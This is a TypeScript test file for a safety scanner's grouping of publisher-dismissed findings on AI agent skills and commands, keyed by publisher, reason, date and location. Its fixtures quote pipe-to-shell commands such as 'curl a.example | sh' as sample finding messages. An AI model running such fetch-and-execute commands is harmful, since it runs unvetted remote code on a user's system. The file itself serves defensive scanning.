import { describe, expect, it } from "vitest";
import type { Finding, FindingDecision, ItemSafety } from "@/bindings";
import { authorSettledCount, publisherGroups } from "./reviewable";

const FINDING: Finding = {
  rule: "dangerous-commands",
  severity: "medium",
  location: "SKILL.md:5",
  message: "makes files writable by every account",
  remediation: "narrow the command",
};

function decision(overrides: Partial<FindingDecision> = {}): FindingDecision {
  return {
    fingerprint: "aaaaaaaaaaaaaaaa",
    token: null,
    state: { state: "open", earlier: null },
    ...overrides,
  };
}

function row(overrides: Partial<ItemSafety> = {}): ItemSafety {
  return {
    kind: "skill",
    name: "mild",
    harness: "claude",
    scope: { scope: "global" },
    location: "",
    safety: { score: 92, deductions: [] },
    quality: null,
    findings: [FINDING],
    skipped: [],
    verdict: "warn",
    reasons: [],
    contentHash: "c",
    reviewHash: "hash-1",
    provenance: "owner/repo",
    override: { state: "absent" },
    decisions: [decision()],
    ...overrides,
  };
}

describe("publisherGroups", () => {
  const settledByPublisher = decision({
    fingerprint: "p",
    state: {
      state: "author-dismissed",
      reason: "intended",
      dismissedAt: "2026-08-16T00:00:00Z",
      publisher: "vanillagreencom/kendex",
    },
  });

  it("says one thing once for one shared tree read by three tools", () => {
    const tools = ["claude", "codex", "pi"] as const;
    const rows = tools.map((harness) =>
      row({ harness, decisions: [settledByPublisher] }),
    );
    const groups = publisherGroups(rows);
    expect(groups).toHaveLength(1);
    expect(groups[0].publisher).toBe("vanillagreencom/kendex");
    expect(groups[0].items.map((item) => item.harness)).toEqual([...tools]);
    // The count the footer sentence quotes is this list's length, not the
    // occurrence count, or the two disagree in one block.
    expect(authorSettledCount(rows)).toBe(3);
  });

  // Two tools locked to different revisions whose item bytes are identical
  // share a review hash, and the publisher can have changed their mind
  // between the two — or simply re-recorded the same call at a later date.
  // One entry can show one reason and one date, so merging prints a
  // judgement made for one tool over the other.
  it("keeps one publisher's two decisions apart, each with its own reason", () => {
    const reconsidered = decision({
      fingerprint: "p",
      state: {
        state: "author-dismissed",
        reason: "wrong-call",
        dismissedAt: "2026-08-19T00:00:00Z",
        publisher: "vanillagreencom/kendex",
      },
    });
    const groups = publisherGroups([
      row({ harness: "claude", decisions: [settledByPublisher] }),
      row({ harness: "codex", decisions: [reconsidered] }),
    ]);
    expect(groups).toHaveLength(2);
    expect(groups.map((group) => group.reason)).toEqual([
      "intended",
      "wrong-call",
    ]);
    expect(groups.map((group) => group.dismissedAt)).toEqual([
      "2026-08-16T00:00:00Z",
      "2026-08-19T00:00:00Z",
    ]);
    expect(
      groups.map((group) => group.items.map((item) => item.harness)),
    ).toEqual([["claude"], ["codex"]]);
  });

  // A publisher settles a sentence wherever the item carries it. Keeping
  // the first occurrence and dropping the rest tells a person their
  // publisher ruled on one line when they ruled on three — on the list
  // whose whole job is saying how far somebody else's judgement reaches.
  it("names every place one decision covers", () => {
    const at = (location: string): Finding => ({ ...FINDING, location });
    const everywhere = row({
      findings: [at("SKILL.md:5"), at("SKILL.md:41"), at("scripts/run.sh:9")],
      decisions: [settledByPublisher, settledByPublisher, settledByPublisher],
    });
    const groups = publisherGroups([everywhere]);
    expect(groups).toHaveLength(1);
    expect(groups[0].locations).toEqual([
      "SKILL.md:5",
      "SKILL.md:41",
      "scripts/run.sh:9",
    ]);
  });

  it("keeps different bytes apart", () => {
    const other = row({
      name: "other",
      reviewHash: "hash-2",
      decisions: [settledByPublisher],
    });
    expect(
      publisherGroups([row({ decisions: [settledByPublisher] }), other]),
    ).toHaveLength(2);
  });

  // A review hash seals the installed kind and the bytes, so two commands
  // with the same body from two catalogs share one. Merging them would
  // print the first catalog's name over content it never reviewed.
  it("keeps two catalogs' identical bytes apart, each under its own name", () => {
    const mine = row({
      kind: "command",
      name: "ship",
      decisions: [settledByPublisher],
    });
    const theirs = row({
      kind: "command",
      name: "deploy",
      decisions: [
        decision({
          fingerprint: "p",
          state: {
            state: "author-dismissed",
            reason: "intended",
            dismissedAt: "2026-08-16T00:00:00Z",
            publisher: "someone/else",
          },
        }),
      ],
    });
    const groups = publisherGroups([mine, theirs]);
    expect(groups).toHaveLength(2);
    expect(groups.map((group) => group.publisher)).toEqual([
      "vanillagreencom/kendex",
      "someone/else",
    ]);
    expect(groups.map((group) => group.items[0].name)).toEqual([
      "ship",
      "deploy",
    ]);
  });

  // One line can match a rule twice: two findings sharing a rule and a
  // location, telling apart only by the sentence each fired with. Keying a
  // row on rule and location alone gives both entries one key, and React is
  // then free to show one publisher's reason against the other's finding —
  // on the list whose whole purpose is saying which call was made about
  // what.
  it("gives two findings on one line two keys", () => {
    const twice = row({
      findings: [
        { ...FINDING, message: "runs `curl a.example | sh`" },
        { ...FINDING, message: "runs `curl b.example | sh`" },
      ],
      decisions: [
        { ...settledByPublisher, fingerprint: "aaaa" },
        { ...settledByPublisher, fingerprint: "bbbb" },
      ],
    });
    const groups = publisherGroups([twice]);
    expect(groups).toHaveLength(2);
    expect(groups.map((group) => group.finding.location)).toEqual([
      FINDING.location,
      FINDING.location,
    ]);
    expect(groups.map((group) => group.finding.message)).toEqual([
      "runs `curl a.example | sh`",
      "runs `curl b.example | sh`",
    ]);
    // The row's key is this, handed to the render site rather than rebuilt
    // there, so the two cannot come back together on the page.
    expect(new Set(groups.map((group) => group.key)).size).toBe(2);
  });

  it("carries nothing the person decided themselves", () => {
    const mine = row({
      decisions: [
        decision({
          state: {
            state: "dismissed",
            reason: "wrong-call",
            dismissedAt: "2026-08-16T00:00:00Z",
          },
        }),
      ],
    });
    expect(publisherGroups([mine])).toEqual([]);
  });
});
